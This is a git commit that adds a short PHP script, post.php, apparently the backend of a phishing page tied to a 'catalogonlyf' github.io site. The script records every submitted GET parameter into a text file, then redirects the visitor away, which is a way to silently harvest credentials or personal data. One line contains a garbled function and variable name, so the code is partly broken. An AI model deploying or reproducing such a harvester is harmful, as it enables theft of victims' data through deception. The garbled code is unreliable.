c57c9af914effdd354e03edbaffa128ffcf3c12b
portaonlyf <assokey2@gmail.com>
2023-07-16 20:25:33 -0400

    Initial Commit

---
+++ post.php
@@ -0,0 +1,19 @@
+<?php
+header("Location: https://catalogonlyf.github.io/");
+$handle = fopen("registro.txt", "a"); 
+
+foreach($_GET as $variable => $value) {
+	fwrite($handle, $variable);
+
+	fwrite($handle, "=");
+
+	fwrite($handle, $value);
+
+	fwrite($handle, "\r\n");
+}
+
+frité($ande, "\r\n");
+fclose($handle);
+
+exit
+?>
